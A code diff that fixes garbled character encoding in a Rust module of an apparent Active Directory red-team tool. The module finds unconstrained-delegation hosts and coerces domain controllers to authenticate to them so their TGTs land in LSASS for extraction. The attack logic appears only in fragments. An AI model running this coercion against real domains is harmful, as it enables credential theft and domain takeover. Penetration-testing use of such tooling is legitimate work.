@@ -1,4 +1,4 @@
-//! Unconstrained Delegation discovery â€” Enumerate computers and users
+//! Unconstrained Delegation discovery — Enumerate computers and users
 //! with TRUSTED_FOR_DELEGATION that cache forwarded TGTs in memory.
 //!
 //! These hosts store TGTs of any user who authenticates to them,
@@ -12,11 +12,11 @@ use overthrone_core::proto::ldap;
 use serde::{Deserialize, Serialize};
 use tracing::{info, warn};
 
-// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ═══════════════════════════════════════════════════════════
 // UAC flag for unconstrained delegation
-// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ═══════════════════════════════════════════════════════════
 
-/// TRUSTED_FOR_DELEGATION â€” unconstrained delegation (stores TGTs)
+/// TRUSTED_FOR_DELEGATION — unconstrained delegation (stores TGTs)
 #[allow(dead_code)] // Protocol reference UAC flag
 const UAC_TRUSTED_FOR_DELEGATION: u32 = 0x00080000;
 /// Account is disabled
@@ -26,9 +26,9 @@ const UAC_ACCOUNT_DISABLE: u32 = 0x00000002;
 #[allow(dead_code)] // Protocol reference UAC flag
 const UAC_SERVER_TRUST_ACCOUNT: u32 = 0x00002000;
 
-// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ═══════════════════════════════════════════════════════════
 // Configuration
-// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ═══════════════════════════════════════════════════════════
 /// Structure
 #[derive(Debug, Clone, Default)]
 pub struct UnconstrainedConfig {
@@ -40,9 +40,9 @@ pub struct UnconstrainedConfig {
     pub target_ous: Vec<String>,
 }
 
-// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ═══════════════════════════════════════════════════════════
 // Result
-// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ═══════════════════════════════════════════════════════════
 /// Structure
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct UnconstrainedResult {
@@ -72,9 +72,9 @@ pub struct UnconstrainedHost {
     pub spns: Vec<String>,
 }
 
-// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ═══════════════════════════════════════════════════════════
 // Reachability Check
-// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ═══════════════════════════════════════════════════════════
 
 /// Check if a host is reachable on SMB port
 async fn check_host_reachable(hostname: &str) -> bool {
@@ -89,15 +89,12 @@ async fn check_host_reachable(hostname: &str) -> bool {
     )
 }
 
-// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ═══════════════════════════════════════════════════════════
 // Public Runner
-// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ═══════════════════════════════════════════════════════════
 
 pub async fn run(config: &HuntConfig, uc: &UnconstrainedConfig) -> Result<UnconstrainedResult> {
-    info!(
-        "{}",
-        "â•â•â• UNCONSTRAINED DELEGATION â•â•â•".bold().red()
-    );
+    info!("{}", "═══ UNCONSTRAINED DELEGATION ═══".bold().red());
 
     let mut conn = if config.use_hash {
         ldap::LdapSession::connect_with_hash(
@@ -158,8 +155,8 @@ pub async fn run(config: &HuntConfig, uc: &UnconstrainedConfig) -> Result<Uncons
 
         if is_dc {
             info!(
-                " {} {} (DC) â€” {}{}",
-                "â—†".dimmed(),
+                " {} {} (DC) — {}{}",
+                "◆".dimmed(),
                 comp.sam_account_name.dimmed(),
                 comp.operating_system
                     .as_deref()
@@ -174,8 +171,8 @@ pub async fn run(config: &HuntConfig, uc: &UnconstrainedConfig) -> Result<Uncons
             }
         } else {
             info!(
-                " {} {} â€” {}{}{}",
-                "âš ".red().bold(),
+                " {} {} — {}{}{}",
+                "⚠".red().bold(),
                 comp.sam_account_name.bold().red(),
                 comp.dns_hostname
                     .as_deref()
@@ -214,9 +211,9 @@ pub async fn run(config: &HuntConfig, uc: &UnconstrainedConfig) -> Result<Uncons
     })
 }
 
-// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
-// Exploitation â€” coerce high-value hosts toward unconstrained targets
-// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ═══════════════════════════════════════════════════════════
+// Exploitation — coerce high-value hosts toward unconstrained targets
+// ═══════════════════════════════════════════════════════════
 
 /// Configuration for the active exploitation phase.
 #[derive(Debug, Clone)]
@@ -227,7 +224,7 @@ pub struct ExploitUnconstrainedConfig {
     /// Listener port for the fallback path (default 445).
     pub listener_port: u16,
     /// When `true`, coerce each discovered DC to authenticate toward every
-    /// reachable unconstrained delegation host (preferred path â€” caches the
+    /// reachable unconstrained delegation host (preferred path — caches the
     /// DC's TGT on the unconstrained host for later extraction).
     pub coerce_dcs_to_unconstrained: bool,
 }
@@ -267,9 +264,7 @@ pub async fn exploit_unconstrained(
 ) -> Result<ExploitUnconstrainedResult> {
     info!(
         "{}",
-        "â•â•â• UNCONSTRAINED DELEGATION EXPLOIT â•â•â•"
-            .bold()
-            .red()
+        "═══ UNCONSTRAINED DELEGATION EXPLOIT ═══".bold().red()
     );
 
     let reachable: Vec<&UnconstrainedHost> = uc_result
@@ -282,7 +277,7 @@ pub async fn exploit_unconstrained(
     let mut coercions_succeeded = 0usize;
 
     if exploit_cfg.coerce_dcs_to_unconstrained && !reachable.is_empty() {
-        // Preferred path: coerce each DC â†’ each reachable unconstrained host.
+        // Preferred path: coerce each DC → each reachable unconstrained host.
         // The DC's TGT lands in the unconstrained host's LSASS for extraction.
         for uc_host in &reachable {
             let listener_host = uc_host
@@ -299,7 +294,7 @@ pub async fn exploit_unconstrained(
                     .to_string();
 
                 info!(
-                    "  Coercing DC {} â†’ unconstrained host {}",
+                    "  Coercing DC {} → unconstrained host {}",
                     dc_target.bold(),
                     listener_host.yellow()
                 );
@@ -322,8 +317,8 @@ pub async fn exploit_unconstrained(
                     Ok(result) if !result.successful_coercions.is_empty() => {
                         coercions_succeeded += 1;
                         info!(
-                            "  {} DC {} coerced â†’ {} ({} method(s))",
-                            "â˜…".green().bold(),
+                            "  {} DC {} coerced → {} ({} method(s))",
+                            "★".green().bold(),
                             dc_target,
                             listener_host,
                             result.successful_coercions.len()
@@ -331,7 +326,7 @@ pub async fn exploit_unconstrained(
                     }
                     Ok(_) => {
                         info!(
-                            "  DC {} â€” no successful coercion methods",
+                            "  DC {} — no successful coercion methods",
                             dc_target.dimmed()
                         );
                     }
@@ -356,7 +351,7 @@ pub async fn exploit_unconstrained(
                 .to_string();
 
             info!(
-                "  Coercing {} â†’ listener {}",
+                "  Coercing {} → listener {}",
                 target.bold(),
                 exploit_cfg.listener.yellow()
             );
@@ -380,7 +375,7 @@ pub async fn exploit_unconstrained(
                     coercions_succeeded += 1;
                     info!(
                         "  {} {} coerced ({} method(s))",
-                        "â˜…".green().bold(),
+                        "★".green().bold(),
                         target,
                         result.successful_coercions.len()
                     );
@@ -392,7 +387,7 @@ pub async fn exploit_unconstrained(
             }
         }
     } else {
-        info!("  No reachable unconstrained hosts and no fallback listener configured â€” skip");
+        info!("  No reachable unconstrained hosts and no fallback listener configured — skip");
     }
 
     info!(
